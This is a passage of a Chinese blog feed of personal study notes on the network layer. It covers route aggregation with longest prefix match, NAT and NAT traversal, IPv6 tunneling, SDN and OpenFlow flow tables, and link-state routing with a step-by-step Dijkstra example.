<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>ISP也会将这两条聚合成一条消息给Internet中与它直连的路由器：</p>
<table>
<thead>
<tr class="header">
<th>DA</th>
<th>mask</th>
<th>next hop</th>
<th>Inf</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>200.23.16.0</td>
<td>20</td>
<td>IPo</td>
<td>lan0</td>
</tr>
<tr class="even">
<td>...</td>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>此时互联网得到一个DA为200.23.30.8的分组，首先将分组转发给ISP，现在问题来了，这个IP地址其实能与ISP中的两条都匹配的上</p>
<ul>
<li><span class="math inline">\(200.23.30.8 \ \&amp;\&amp;\  (11111111\
11111111\ 11110000\ 00000000) = 200.23.16.0\)</span></li>
<li><span class="math inline">\(200.23.30.8 \ \&amp;\&amp;\  (11111111\
11111111\ 11111110\ 00000000) = 200.23.30.0\)</span></li>
</ul>
<p>那么这个时候分组该如何转发呢？</p>
<p>这个时候就需要用到<strong>最长前缀匹配</strong>。以这个为例，200.23.30.8的前缀（高位）能够与两个网络匹配上，但是后者匹配的前缀比前者要多（多3位），因此这时候路由器认为后者匹配上，因此转发到对应的路由器，直接到部门8。</p>
<p>这里也体现了路由聚合的一个特点：<strong>大概聚合</strong>。本例子中的体现就是200.23.16.0/20网络分成了8个，机构路由器只知道其中6个，不知道另外两个，但是向外聚合的时候还是宣告了
200.23.16.0/20 整个网络，反正有最长前缀匹配兜底。</p>
<h2 id="nat网络地址转换">3.3. NAT：网络地址转换</h2>
<p><strong>NAT: Network Address Translation</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605162433.png" /></p>
<p>路由器拥有一个公网IP地址：138.76.29.7，拥有一个内网IP地址：10.0.0.4（这个称为这个内网的网关），内网的主机分配专用的IP地址。</p>
<p>假设10.0.0.1需要发送分组给外网某台主机，需要先通过网关，然后路由器将源IP地址和源端口修改为138.76.29.7和一个路由器上没被使用的端口，并记录映射关系。外网主机回的响应中，目标IP地址和端口是路由器修改后的信息，到达路由器后通过映射关系修改响应的目标IP和端口为最开始的源IP和端口。</p>
<p>这时候就会有人问了：“为什么这么多主机要共用一个IP呢？多买几个不就好了？”。这就是互联网版“何不食肉糜”。</p>
<p>本地网络只有一个有效IP地址的好处：</p>
<ul>
<li><strong>省钱</strong></li>
<li>即使路由器IP因为DHCP变化了，内网主机的IP也不需要修改</li>
<li>内网主机IP修改也不需要告诉外网的任何设备</li>
<li>内网对于外网来说是透明的，外网只知道138.76.29.7这个IP的设备，并不知道路由器后面的主机</li>
</ul>
<p>实现NAT功能，NAT路由器必须：</p>
<ul>
<li><strong>对于外出数据包</strong>：要将<strong>源地址和端口</strong>修改为NAT
IP地址和新的端口</li>
<li><strong>记住</strong>：需要将每个转换对记录在NAT转换表中
<code>源IP, 源port -&gt; NAT IP, 新port</code></li>
<li><strong>对于进入数据包</strong>：替换<strong>目标IP地址和端口</strong>，采用存储在NAT表中的表项替换</li>
</ul>
<p>一个例子如下图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605163512.png" /></p>
<ol type="1">
<li>主机 10.0.0.1:3345 发送数据给 128.119.40.186:80</li>
<li>NAT 路由器修改源IP为138.76.29.7，将源port修改为
5001，记录到NAT表中，然后将数据发出</li>
<li>主机收到数据后给目标地址为
138.76.29.7，目标port为5001的设备响应</li>
<li>到达NAT路由器，通过比对NAT表，修改目标地址为
10.0.0.1，修改port为3345，然后转发给对应主机</li>
</ol>
<p>NAT可行吗？一个内网可能有多个主机，每个主机都有65535个端口，NAT路由器端口也就65535，不够映射呀？答案是可行的。</p>
<ul>
<li>内网的主机的所有端口同时存在进程，并且同时与外界通信。一般都不会超过65535个会话，所以够用</li>
</ul>
<p>对NAT其实是有一定争议的。</p>
<ul>
<li>首先，因为路由器只有3层，而端口属于4层的信息，这里NAT路由器对端口进行了修改，也就是3层设备修改了4层消息。</li>
<li>其次，违反了end-to-end原则（复杂性放到端系统实现）</li>
<li>最后，外网的主机无法主动与内网主机连接（外网根本不知道有内网存在）。<strong>解决办法：内网穿越</strong></li>
</ul>
<p><strong>使用NAT也是没有办法的办法，归根结底还是IP不够了，如果每台主机一个IP，全球的主机以亿为单位，根本不够分。因此，现在正在推出IPv6来解决这个问题。</strong></p>
<h3 id="内网穿越">3.3.1. 内网穿越</h3>
<p>问题就是外网的一个客户需要连接 10.0.0.1
的服务器的80端口该怎么办？</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605164420.png" /></p>
<p>有3个方法：</p>
<ol type="1">
<li><p>静态配置NAT。直接在NAT表中写入（服务器IP，服务器端口，新端口）
<code>10.0.0.1, 80, 5001</code>。那么外界直接连接NAT路由器的5001端口就可以访问到10.0.0.1:80的服务。对于外界来说就像是NAT路由器的5001端口提供了服务。</p></li>
<li><p>Universal Plug and Play(UPnP) Internet Gateway
Device(IGD)协议。本质上就是由静态配置NAT变成动态配置NAT</p>
<ol type="1">
<li>允许内网主机获知NAT路由器的公共IP地址，以及存在的端口映射；</li>
<li>找打一个未被使用的端口，将其与内网主机的80端口绑定，并写入NAT表</li>
<li>外网客户就能够通过NAT路由器的端口访问内网主机的80端口的服务</li>
<li>如果内网主机关掉服务，就会找到NAT表中的记录，并删除</li>
</ol></li>
<li><p>中继（used in Skype）</p>
<ol type="1">
<li>内网主机先<strong>主动</strong>与中继建立连接</li>
<li>外网客户连接到中继</li>
<li>之后就可以通过中继进行通信了</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605165238.png" /></p></li>
</ol>
<h2 id="ipv6">3.4. IPv6</h2>
<p>IPv4的地址空间已经被用完了，需要更多的地址空间。这就是IPv6的初始动机。</p>
<p>另外的动机：</p>
<ol type="1">
<li>头部格式的改变帮助加速处理和转发
<ul>
<li>取消TTL字段</li>
<li>取消checksum</li>
<li>取消分片</li>
</ul></li>
<li>头部格式的改变帮助QoS(Quality of service)</li>
</ol>
<p>IPv6 数据报格式：</p>
<ul>
<li>固定的40字节头部</li>
<li>数据报传输过程不允许分片</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605170825.png" /></p>
<ul>
<li>priority:
标示流中数据报的优先级。要配合流量政策一起使用。“大家都是VIP，那么大家都不是VIP”</li>
<li>FLow Label: 标示数据报在一个 “flow”
中。（flow概念没有被严格定义）比方说同一IP的数据报属于同一flow，被打上相同的flow
Label。希望网络对同一flow的数据报作相同的处理</li>
<li>next header：标示上层协议</li>
</ul>
<p>和IPv4的变化：</p>
<ul>
<li>checksum被移除</li>
<li>Options：允许，但是在头部之外，被 “next headder”
指示哪里是options，具体值为多少。</li>
<li>ICMPv6
<ul>
<li>附加了新的报文类型，比方说 "packet too big"</li>
<li>多播组管理功能</li>
</ul></li>
</ul>
<p>因为IPv6不支持分片，所以一旦IPv6路由器收到一个特别大的数据报，会直接丢弃，然后通过ICMPv6发送分组告诉源主机，"packet
too big"。</p>
<h3 id="隧道tunneling">3.4.1. 隧道(Tunneling)</h3>
<p>IPv4到IPv6的升级一定是平滑的、过渡式的。过渡的过程分为早期、晚期、实现三个阶段。</p>
<p><strong>早期的时候</strong>，IPv6的网络少于IPv4的网络。下图中，一整个大圆标示IPv4的网络，小圆标示IPv6的网络。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605171707.png" /></p>
<p>IPv4网络内部的通信，IPv6网络内部的通信都是没问题的。有问题的就是IPv6的网络如何跨过IPv4的网络与另一个IPv6网络通信。这就要使用到隧道技术。</p>
<p>上图中标红的路由器就是双栈路由器（同时支持IPv4和IPv6），左边的数据报到达路由器，将IPv6的数据报封装成IPv4的数据报，然后发到IPv4的路由器，经转发到达右边的双栈路由器，将IPv4的数据报解封装成IPv6的数据报，然后就可以在右边的网络中转发。</p>
<p><strong>隧道技术视图</strong>：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605172401.png" /></p>
<p><strong>晚期的时候，攻守之势异也</strong></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605172217.png" /></p>
<p>但是技术还是那个技术。就不多赘述了。</p>
<p>最后实现了IPv4到IPv6的升级。</p>
<h1 id="通用转发和sdn">4. 通用转发和SDN</h1>
<p>之前介绍过传统的路由方法都是通过分布式，每台设备实现数据平面和控制平面的功能：</p>
<ol type="1">
<li><strong>垂直集成</strong>：每台路由器或其他网络设备，包括：
<ol type="1">
<li>硬件、私有的网络操作系统以及运行在上面的软件</li>
<li>互联网标准协议(IP, RIP, IS-IS, OSPF, BGP)的私有实现</li>
<li>从软件到硬件都有一个产商提供（一个产商的操作系统可能不能运行在另一个产商的硬件之上）</li>
</ol></li>
<li>设备基本上<strong>只能够按照设计好的固定方式工作</strong>，<strong>控制逻辑固化</strong>。不同的网络功能需要不同的网络设备实现。</li>
</ol>
<p>上面的两个特点就导致了传统方式实现网络功能的问题：</p>
<ul>
<li>垂直集成 -&gt; 昂贵、不利于创新生态</li>
<li>分布式、固化设备功能 == 网络设备种类繁多
<ul>
<li>无法改变路由等工作逻辑、无法实现流量工程等高级特性</li>
<li>配置错误影响全网运行；升级和维护会涉及到全网设备 -&gt; 管理困难</li>
<li>要增加新的网络功能，需要涉及、实现以及部署新的特定设备 -&gt;
网络设备种类越来越繁多</li>
</ul></li>
</ul>
<p>SDN的出现就是用来解决以上问题的。SDN主要思路：</p>
<ul>
<li><strong>网络设备的控制平面和数据平面分离</strong></li>
<li>数据平面由分组交换机实现：
<ul>
<li>将路由器、交换机和目前绝大多数网络设备的功能进一步<strong>抽象</strong>成：按照刘表（由控制平面<strong>设置</strong>的控制逻辑）进行分组的动作（包括转发、丢弃、泛洪、阻塞、拷贝）</li>
<li><strong>统一化</strong>设备功能：SDN交换机（分组交换机）<strong>执行</strong>控制逻辑</li>
</ul></li>
<li>控制平面由控制器加上网络应用来实现
<ul>
<li>计算和下方控制逻辑：流表</li>
</ul></li>
</ul>
<p><strong>SDN控制平面和数据平面分离的优势</strong>：</p>
<ol type="1">
<li><strong>水平集成</strong>：创造更好的生态，促进发展
<ul>
<li>分组交换机、控制器和各种控制逻辑网络应用都可以由不同产商生产，只要符合标准即可</li>
</ul></li>
<li><strong>集中式</strong>实现控制逻辑，使得网络管理更容易：
<ul>
<li>集中式控制器了解网络状况，编程简单，而传统方式比较困难</li>
<li>避免路由器的误配置</li>
</ul></li>
<li><strong>基于流表的匹配+行动</strong>的工作方式允许“可编程的”分组交换机
<ul>
<li>实现流量工程等高级特性</li>
<li>在此框架下实现各种新型的网络设备</li>
</ul></li>
</ol>
<p>类比：PC产业</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605200856.png" /></p>
<p>流量工程在传统路由方式下实现困难，比方说下图</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605200938.png" /></p>
<p>如果我们想要流量走uvwz该怎么办呢？在传统方式下只能够通过修改链路的代价，然后流量路由算法以此作运算。但是修改链路的权重这非常困难，很且会影响其他路由。</p>
<p>再比如想让下图中的不同的流量采取不同的路由，传统方式该如何实现呢？答案是无法实现。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605201138.png" /></p>
<h2 id="sdn架构">4.1. SDN架构</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605201336.png" /></p>
<h3 id="数据平面交换机">4.1.1. 数据平面交换机</h3>
<ul>
<li>快速，简单，商业化交换设备采用硬件实现通用转发功能</li>
<li>流表被控制器计算和下发</li>
<li>基于<strong>南向接口</strong>，SDN控制器访问基于流的交换机</li>
<li>也定义了控制器的协议（只有满足协议才能够使分组交换机正常工作）</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605201744.png" /></p>
<h3 id="sdn控制器">4.1.2. SDN控制器</h3>
<p>SDN控制器也称为网络OS：</p>
<ol type="1">
<li>维护网络状态信息</li>
<li>通过上面的<strong>北向接口</strong>和网络控制应用交互</li>
<li>通过下面的<strong>南向接口</strong>和网络交换机交互</li>
<li>逻辑上集中，但是实现上通常由于性能、可拓展性、容错性以及鲁棒性采用分布式方法（毕竟一台服务器可能无法实现这么多的功能，需要多台服务来实现）</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605201836.png" /></p>
<h3 id="控制应用">4.1.3. 控制应用</h3>
<p>网络控制应用：</p>
<ul>
<li>控制的大脑：采用下层提供的服务，实现网络功能：
<ul>
<li>路由器、交换机</li>
<li>接入控制、防火墙</li>
<li>负载均衡</li>
<li>其他功能</li>
</ul></li>
<li>非绑定：可以由第三方提供，可以与控制器产商不同，与分组交换机产商也可以不同</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202013.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202110.png" /></p>
<h2 id="sdn例子openflow">4.2. SDN例子：OpenFlow</h2>
<h3 id="数据平面">4.2.1. 数据平面</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202137.png" /></p>
<p>比方说：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202204.png" /></p>
<ol type="1">
<li>源IP为 <code>1.2.*.*</code> 目标IP为 <code>3.4.5.*</code>
的分组直接丢弃</li>
<li>源IP为 <code>*.*.*.*</code> 目标IP为 <code>3.4.*.*</code>
的分组转发到端口2</li>
<li>源IP为 <code>10.1.2.3</code> 目标IP为 <code>*.*.*.*</code>
的分组转发送到控制器</li>
</ol>
<h3 id="流表的表项结构">4.2.2. 流表的表项结构</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202400.png" /></p>
<p>例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202413.png" /></p>
<p>解释：如果分组的目标IP地址是
<code>51.6.0.8</code>，应该通过端口6转发</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202511.png" /></p>
<p>解释：阻塞所有目标端口为22/TCP的分组</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202546.png" /></p>
<p>解释：阻塞所有源IP为 128.119.1.1 的分组</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605202617.png" /></p>
<p>解释：所有源MAC地址为 22:A7:23:11:E1:02 都应该通过端口3转发</p>
<h3 id="openflow工作模式">4.2.3. OpenFlow工作模式</h3>
<p><strong>采用<code>match + action</code>统一各种网络设备提供的功能</strong>。比方说：</p>
<ol type="1">
<li>路由器
<ul>
<li>match：最长前缀匹配</li>
<li>action：通过一条链路转发</li>
</ul></li>
<li>防火墙
<ul>
<li>match：IP地址和端口号</li>
<li>action：允许或者阻塞</li>
</ul></li>
<li>交换机
<ul>
<li>match：目标MAC地址</li>
<li>action：转发或者泛洪</li>
</ul></li>
<li>NAT
<ul>
<li>match：IP地址和端口</li>
<li>action：重写地址和端口</li>
</ul></li>
</ol>
<p>目前几乎所有的网络设备都可以在这个 <code>match+action</code>
模式框架下进行描述。</p>
<p>下面是一个例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605203048.png" /></p>
<p>红色：来自6号主机的分组到达分组交换机s3，因为流表中“源IP为<code>10.3.*.*</code>，目标IP为<code>10.2.*.*</code>的分组通过端口3转发”，所以从端口3出去，到达s1。因为流表从4端口转发，到达s2，最终由4端口转发到达主机4。</p>
<p>绿色过程和上面基本一致，只有在s2不一样，从端口3转发到达主机3。</p>
<p><strong>流表是控制平面计算出来的</strong>。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>计算网络教程 自顶向下方法</tag>
        <tag>B站中科大计网</tag>
      </tags>
  </entry>
  <entry>
    <title>第 5 章 网络层：控制平面</title>
    <url>/2022/06/06/%E7%AC%AC%205%20%E7%AB%A0%20%E7%BD%91%E7%BB%9C%E5%B1%82%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%B9%B3%E9%9D%A2/</url>
    <content><![CDATA[<p>个人的知识笔记。</p>
<span id="more"></span>
<h1 id="路由选择算法">1. 路由选择算法</h1>
<h2 id="路由route相关概念">1.1. 路由(route)相关概念</h2>
<p>路由：按照<strong>某种指标</strong>找到一条从源节点到目标节点的<strong>较好路径</strong>。</p>
<ul>
<li>较好路径：按照某种指标，代价较小的路径</li>
<li>指标：跳数、费用、队列长度等，也可以是一些指标的加权平均</li>
<li>采用什么样的指标，标示网络使用者希望网络在什么方面表现突出</li>
</ul>
<p>以网络（子网）为单位进行路由（路由信息通过+路由通告）</p>
<ul>
<li>网络为单位进行路由，路由信息传输、计算和匹配的代价低（以网络为单位，路由表可能只有一个表项。以主机为单位，路由表可能就有几百个表项）</li>
<li>前提条件：一个网络的所有节点地址前缀相同（同一网络号，或者网络号可以聚合），且物理上聚集</li>
<li>路由就是：计算网络到其他网络如何走的问题</li>
</ul>
<p>网络到网络的路由 == 路由器到路由器之间的路由</p>
<ul>
<li>路由器连接至少两个网络</li>
<li>在一个网络中：路由器到主机的通信在数据链路层解决</li>
<li><strong>到了这个路由器，就到了这个网络</strong></li>
</ul>
<p>路由选择算法(routing
algorithm)：网络层软件的一部分（控制平面），完成路由功能。</p>
<p>网络拓扑抽象：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605222946.png" /></p>
<p>链路的代价可能是：</p>
<ul>
<li>链路带宽的倒数（链路带宽越大，代价越小）</li>
<li>拥塞情况的倒数（越拥塞，代价越小）</li>
</ul>
<p>路由的目的是找到从源节点到目标节点的较好路径。因此，我们需要源节点、目标节点、网络的拓扑以及每条边（链路）的代价。最后得到的是路径。</p>
<p>如果我们没有目标节点，我们想知道源节点到其他所有节点的较好路径。那么：</p>
<ul>
<li>输入：网络拓扑、边的代价、源节点</li>
<li>输出：源节点的汇集树(sink tree)</li>
</ul>
<p>汇集树：</p>
<ul>
<li>此节点到其他所有节点的 <strong>最优路径（某种指标最优）</strong>
形成的树（最优化原则, optimality principle）</li>
<li>路由选择算法就是为所有路由器找到并使用汇集树</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605223522.png" /></p>
<p>左边是错的，右边是对的。因为路由选择算法得到的是树（假设把没有环的图也当作树），不是图。如果存在环，比如说左图中的L点，会形成这么一个环：<code>FKLGDHF</code>，那么从B点到L就会存在至少两条路径：</p>
<ol type="1">
<li>BAFKL</li>
<li>AFHDGL</li>
</ol>
<p>这两条路径在某个指标下，一定会有一条优于另一条。那么另一条就要从输出中消失，因此输出是树，不会是图。</p>
<p>路由的原则：</p>
<ol type="1">
<li><strong>正确性(correctness)</strong>：算法必须是正确的和完整的，使分组一站一站接力，正确到达目标站；完整：目标所有的站的地址，在路径中的路由器的路由表中都能找到相应的表项</li>
<li><strong>简单性(simplicity)</strong>：算法在计算机上应该简单：最优但复杂的算法，时间上延迟比较大，不实用，不应该为了获取路由信息增加很多的通信量。</li>
<li><strong>健壮性(robustness)</strong>：算法应该能够适应<strong>通信量</strong>和<strong>网络拓扑</strong>的变化；通信量变化、网络拓扑的变化算法能很快适应；不向很拥挤的链路、断了的链路发送数据</li>
<li><strong>稳定性(stability)</strong>：产生的路由不应该摇摆</li>
<li><strong>公平性(fariness)</strong>：对每一个站点都公平</li>
<li><strong>最优性(optimality)</strong>：某一指标的最优；实际上，获取最优结果的代价较高，可以是次优</li>
</ol>
<p>路由算法的分类，根据路由信息的不同可以分为两类：</p>
<ol type="1">
<li>全局：所有的路由器拥有完整的网络拓扑和边的代价的信息 -&gt;
<strong>link state 算法</strong></li>
<li>局部：路由器只知道邻居路由器（直接相连）和到邻居路由器的代价。通过<strong>迭代的</strong>与邻居交换路由信息、计算路由信息
-&gt; <strong>distance vector 算法</strong></li>
</ol>
<p>至于怎么获得信息，后面说算法的时候会说明。这里介绍一下<strong>迭代的与邻居交互</strong>的意思，假设下面是一个简单的网络拓扑，刚开始路由器上没有任何信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220605224947.png" /></p>
<ol type="1">
<li>第一个周期：所有路由器都发出消息“谁是我的邻居”，邻居收到之后就会给它会消息。这时候A就知道B是它的邻居</li>
<li>第二个周期：所有路由器都告诉自己的邻居的信息。比如说B告诉A“我的邻居除了你，还有C”，这样子A就知道可以通过B到达C。同样的C也会告诉B“我的邻居除了你，还有D”</li>
<li>第三个周期：再次进行2步骤，B告诉A“我的邻居C可以到达B”。这之后A就知道了可以通过B到C，最后到D</li>
</ol>
<p>上述过程简单讲述了如何获取网络拓扑，其实代价也可以同时告诉邻居。这就是一个迭代的过程。</p>
<h2 id="link-state-routing">1.2. Link State Routing</h2>
<p>LS路由选择算法的工作大致上可以分为两个阶段：</p>
<ol type="1">
<li>收集信息</li>
<li>路由选择</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606082956.png" /></p>
<p>基本工作过程如下：</p>
<ol type="1">
<li><p>发现相邻节点，获知对方网络地址</p></li>
<li><p>测量到相邻节点的代价（延迟、开销等）</p></li>
<li><p>将到达相邻节点的代价情况封装到一个LS分组内</p></li>
<li><p>将分组通过泛洪的方式扩散到整个网络</p>
<p>（以上4步让每个路由器获得网络拓扑和边的代价）</p></li>
<li><p>通过Dijkstra算法找出最短路径（这个才是真正的路由算法）</p></li>
</ol>
<h3 id="具体工作流程">1.2.1. 具体工作流程</h3>
<h4 id="发现相邻节点获取对方网络地址">1.2.1.1.
发现相邻节点，获取对方网络地址</h4>
<ul>
<li>一个路由器上线之后，向连接的所有线路发送分组“say hello”</li>
<li>邻居路由器收到分组之后，回送应答，在应答分组中指出自己的名字（IP）</li>
<li>邻居路由器还将收到的分组继续转发</li>
</ul>
<h4 id="测量到响铃节点的代价">1.2.1.2. 测量到响铃节点的代价</h4>
<ul>
<li>发送一个分组要求对方立即响应</li>
<li>回送一个echo分组</li>
<li>通过测量时间可以估算出延迟情况</li>
</ul>
<h4 id="封装一个分组描述相邻节点情况">1.2.1.3.
封装一个分组，描述相邻节点情况</h4>
<ul>
<li>发送者的名称（IP）</li>
<li><strong>序号(seq)、年龄(age)</strong></li>
<li>列表：给出它相邻节点，和它到相邻节点的延迟</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606085221.png" /></p>
<h4 id="将分组泛洪">1.2.1.4. 将分组泛洪</h4>
<p>泛洪的时候会产生两个问题：</p>
<ol type="1">
<li>一个分组泛洪到整个网络最后又回到本身，然后再次将其转发。不断重复，会导致网络中充斥着“路由通告”信息</li>
<li>因为泛洪的原因，即使新的路由通告产生，旧的也不会消失，会导致网络内有许多没有意义的信息</li>
</ol>
<p>解决第一个问题的办法之前其实也谈过，可以使用TTL字段，每到一个路由器值就减1，减到0就不再转发。这里使用的是
age ，每过一段时间，age值减1，age减到0的时候，分组被丢弃</p>
<p>解决第二个问题的办法就是“版本号”，如果能够区分路由信息的新、老版本，就可以选择丢弃旧版本，转发新版本。这就是
seq 的作用。如果有新的路由信息，则新的分组 seq
在之前的基础上加1，其他路由器如果收到新的之后，就不会再转发旧的。路由器崩溃/重启之后序号从0开始。</p>
<p>除此之外，路由器还会维护一个表：扩散分组的表（上图中的B节点的表）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606085930.png" /></p>
<ul>
<li>source：从哪个节点收到的LS分组</li>
<li>seq，age：上面说了作用</li>
<li>send flags：发送标记，必须向指定的哪些相邻站点转发LS分组</li>
<li>ACK
flags：应答标记，本站点必须向哪些相邻站点发送Ack。LS分组必须收到Ack，目的就是为了让所有节点都收到消息（没有Ack，不知道对方收没收到）</li>
<li>DATA：来自source站点的LS分组数据</li>
</ul>
<h4 id="通告dijkstra算法找出最短路径">1.2.1.5.
通告Dijkstra算法找出最短路径</h4>
<ul>
<li>路由器获得各站点LS分组和整个网络拓扑</li>
<li>通过Dijkstra算法计算出到其他各路由器的最短路径（汇集树）</li>
<li>将计算结果安装到路由表中</li>
</ul>
<p>Dijkstra在路由选择中有可能会产生震荡。假设链路的代价 =
链路承载的流量</p>
<p>刚开始，通过Dijkstra得到最优路径，因此该路径上的链路必定会承载更多的流量，因此，路径上的链路代价升高，此时Dijkstra重新开始计算路径，得到另一条路径。新得到的路径上的链路代价也会随之升高，原路径的代价随之减少。再次重新路由，又得到原来的路径（也可能是其他路径）。如此往复产生震荡</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606100114.png" /></p>
<h3 id="dijkstra算法">1.2.2. Dijkstra算法</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606090833.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606090910.png" /></p>
<ol type="1">
<li>初始化
<ul>
<li>刚开始的时候，除了源节点，所有节点都是临时节点</li>
<li>节点代价除了与源节点相邻的节点之外，都为 ∞</li>
</ul></li>
<li>从所有临时节点中找到一个<strong>节点代价最小</strong>的临时节点，将其变成你永久节点（假设为w）</li>
<li>对此节点的<strong>所有在临时节点集合中的相邻节点（假设某个节点为v）</strong>
<ul>
<li>如果D(v) &gt; D(w) +
c(w,v)，说明源节点从w到达v比直接到达v代价更小，因此，v节点的标记应该更改为
(D(w)+c(w,v), w)</li>
<li>否则，不修改标记</li>
</ul></li>
<li>回到第2步开始循环</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606090805.png" /></p>
<p>以上图为例，假设最开始源节点为A，那么：</p>
<ol type="1">
<li>初始化之后</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606091803.png" /></p>
<ul>
<li>永久节点集合 N' = {A}</li>
<li>临时节点集合 I-N' = {B,C,D,E,F,G,H}</li>
</ul>
<ol start="2" type="1">
<li>从临时节点中找到代价最小的节点B，将其变成永久节点</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606091814.png" /></p>
<ol start="3" type="1">
<li>对B节点的所有在临时节点集合中的相邻节点（C，E）作检查</li>
</ol>
<p>C：<strong>通过B到达C的代价为 2+7=9</strong> &lt;
∞，因此需要重新修改</p>
<p>E：<strong>通过B到达E的代价为 2+2=4</strong> &lt;
∞，因此需要重新修改</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092036.png" /></p>
<ol start="4" type="1">
<li>从临时节点中找到代价最小的节点E，将其变成永久节点</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092137.png" /></p>
<ol start="5" type="1">
<li>对E节点的所有在临时节点集合中的相邻节点（G，F）作检查</li>
</ol>
<p>G：<strong>通过E到达G的代价为 4+1=5</strong> &lt;
6，因此需要重新修改</p>
<p>F：<strong>通过E到达F的代价为 4+2=6</strong> &lt;
∞，因此需要重新修改</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092311.png" /></p>
<ol start="6" type="1">
<li>从临时节点中找到代价最小的节点G，将其变成永久节点</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092405.png" /></p>
<ol start="7" type="1">
<li>对G节点的所有在临时节点集合中的相邻节点（H）作检查</li>
</ol>
<p>H：<strong>通过G到达H的代价为 5+4=9</strong> &lt;
∞，因此需要重新修改</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092501.png" /></p>
<ol start="8" type="1">
<li>从临时节点中找到代价最小的节点F，将其变成永久节点</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092525.png" /></p>
<ol start="9" type="1">
<li>对F节点的所有在临时节点集合中的相邻节点（C，H）作检查</li>
</ol>
<p>H：<strong>通过F到达H的代价为 6+2=8</strong> &lt;
9，因此需要重新修改</p>
<p>C：<strong>通过F到达C的代价为 6+3=9</strong> =
9，可修改也可以不修改（如果追求跳数最小则修改，我这里就不修改了）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092726.png" /></p>
<ol start="10" type="1">
<li>从临时节点中找到代价最小的节点H，将其变成永久节点</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092749.png" /></p>
<ol start="11" type="1">
<li>对H节点的所有在临时节点集合中的相邻节点（D）作检查</li>
</ol>
<p>D：<strong>通过H到达D的代价为 8+2=10</strong> &lt;
∞，因此需要重新修改</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092838.png" /></p>
<ol start="12" type="1">
<li>从临时节点中找到代价最小的节点C，将其变成永久节点</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220606092858.png" /></p>
<ol start="13" type="1">
<li>对C节点的所有在临时节点集合中的相邻节点（D）作检查</li>
</ol>
<p>D：<strong>通过C到达D的代价为 9+3=12</strong> &gt;
10，因此不需要修改</p>
